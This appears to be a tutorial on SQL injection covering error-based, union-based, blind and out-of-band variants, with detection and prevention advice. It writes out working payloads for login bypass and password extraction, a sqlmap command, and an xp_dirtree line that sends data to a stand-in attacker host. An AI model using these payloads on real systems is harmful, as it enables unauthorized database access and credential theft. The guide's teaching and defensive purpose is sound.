# SQL Injection (SQLi)

## CONTENTS
1. [What is SQL Injection?](#1-what-is-sql-injection)
2. [Impact of SQL Injection Vulnerabilities](#2-impact-of-sql-injection-vulnerabilities)
3. [Common Types of SQL Injection](#3-common-types-of-sql-injection)
   - [In-Band SQL Injection](#31-in-band-sql-injection)
     - [Error-Based SQL Injection](#311-error-based-sql-injection)
     - [Union-Based SQL Injection](#312-union-based-sql-injection)
   - [Inferential (Blind) SQL Injection](#32-inferential-blind-sql-injection)
     - [Boolean-Based SQL Injection](#321-boolean-based-sql-injection)
     - [Time-Based SQL Injection](#322-time-based-sql-injection)
   - [Out-of-Band SQL Injection](#33-out-of-band-sql-injection)
4. [How to Find SQL Injection Vulnerabilities](#4-how-to-find-sql-injection-vulnerabilities)
5. [Prevention of SQL Injection Vulnerabilities](#5-prevention-of-sql-injection-vulnerabilities)
6. [References](#6-references)

---

## 1. What is SQL Injection?

SQL Injection (SQLi) is a vulnerability where an attacker interferes with the SQL queries an application makes to its database. By manipulating input fields or URLs, attackers can access, modify, or delete sensitive data in the database.

**Example**:
- Input: `admin'--`
- Query: `SELECT * FROM users WHERE username = 'admin'--' AND password = '';`
- Result: Logs in as admin without needing the password.

SQL Injection occurs when attackers inject malicious SQL code into user input fields or URLs to execute unauthorized database queries. This can lead to data theft, modification, or even remote code execution.

**Example Scenario**:
1. User logs into a web application with `username` and `password`.
2. The attacker injects SQL code into the username field: `admin'--`.
3. The application executes the query, logging the attacker in as admin.

---

## 2. Impact of SQL Injection Vulnerabilities

1. **Confidentiality**:
   - Unauthorized access to sensitive data such as usernames, passwords, and credit card numbers.
2. **Integrity**:
   - Attackers can modify or corrupt database records.
3. **Availability**:
   - SQL Injection can be used to delete critical data, rendering the application unusable.

---

## 3. Common Types of SQL Injection

### 3.1. In-Band SQL Injection

**Theory**  
In-band SQLi occurs when the attacker uses the same communication channel to launch the attack and gather the results.

**Categories**:
- **Error-Based SQL Injection**
- **Union-Based SQL Injection**

#### 3.1.1. Error-Based SQL Injection

**Theory**  
Error-based SQLi forces the database to generate error messages, revealing information that helps refine the injection.

**Steps to Exploit**:
1. Submit SQL-specific characters (`'`, `"`) and look for errors.
2. Example:
   - Input: `www.example.com/app?id='`
   - Output: `You have an error in your SQL syntax...`

---

#### 3.1.2. Union-Based SQL Injection

**Theory**  
Union-based SQLi leverages the `UNION` operator to combine results of multiple queries into a single output.

**Steps to Exploit**:
1. Identify the number of columns:
   - Incrementally inject `ORDER BY` clauses until an error occurs.
   - Example: `ORDER BY 1--`, `ORDER BY 2--`, `ORDER BY 3--`.
2. Find columns with useful data types:
   - Inject payloads to test each column:  
     `' UNION SELECT 'a',NULL--`  
     `' UNION SELECT NULL,'a'--`

**Example Payload**:
`www.example.com/app?id=1 UNION SELECT username, password FROM users--`

---

### 3.2. Inferential (Blind) SQL Injection

**Theory**  
Blind SQLi occurs when there is no direct data transfer, but the attacker can infer information by observing the application's behavior.

**Categories**:
- **Boolean-Based SQL Injection**
- **Time-Based SQL Injection**

#### 3.2.1. Boolean-Based SQL Injection

**Theory**  
Uses Boolean conditions to infer data by observing application responses.

**Steps to Exploit**:
1. Submit a payload that evaluates to `TRUE`:
   - `www.example.com/app?id=1 AND 1=1`.
2. Submit a payload that evaluates to `FALSE`:
   - `www.example.com/app?id=1 AND 1=2`.

**Advanced Payload**:
`www.example.com/app?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'`

---

#### 3.2.2. Time-Based SQL Injection

**Theory**  
Relies on database delays to infer information.

**Steps to Exploit**:
1. Submit a payload to pause execution:
   - `www.example.com/app?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)`.
2. Observe response times:
   - If delayed, the condition is true.

---

### 3.3. Out-of-Band SQL Injection

**Theory**  
Out-of-Band SQLi uses external communication (e.g., DNS, HTTP) to exfiltrate data. It is less common but effective when other techniques fail.

**Example Payload**:
`'; exec master..xp_dirtree '//attacker.com/a'--`

---

## 4. How to Find SQL Injection Vulnerabilities

### Steps for Manual Testing
1. **Identify Input Points**:
   - Map the application for user inputs (e.g., forms, query parameters, headers).
2. **Inject Test Payloads**:
   - Submit `'`, `"`, `--`, `#`, and observe responses.
3. **Analyze Responses**:
   - Look for:
     - SQL errors (e.g., "syntax error").
     - Differences in application behavior.

### Automated Testing
1. Use tools like:
   - **sqlmap**: Automates SQLi detection and exploitation.
     ```bash
     sqlmap -u "http://example.com/app?id=1"
     ```
   - **Burp Suite Scanner**: Identifies injection points during dynamic analysis.
2. Monitor for anomalies:
   - Unusual delays.
   - Exfiltration requests.

---

## 5. Prevention of SQL Injection Vulnerabilities

### Primary Defenses

1. **Prepared Statements (Parameterized Queries)**:
   - Always use placeholders for user inputs.

   **Example**:  
   `query = "SELECT * FROM users WHERE username = ? AND password = ?"`

2. **Stored Procedures**:
   - Encapsulate queries in stored procedures, ensuring parameterized calls.

3. **Whitelist Input Validation**:
   - Define acceptable inputs and reject everything else.

4. **Escaping User Input**:
   - Escape special characters in inputs as a last resort.

---

### Additional Defenses

1. **Enforce Least Privilege**:
   - Use minimal database privileges for the application.
   - Disable unused database functions.

2. **Regularly Apply Security Patches**:
   - Ensure the database is updated with vendor patches.

---

## 6. References

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)  
- [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)  
- [PentestMonkey – SQL Injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)  
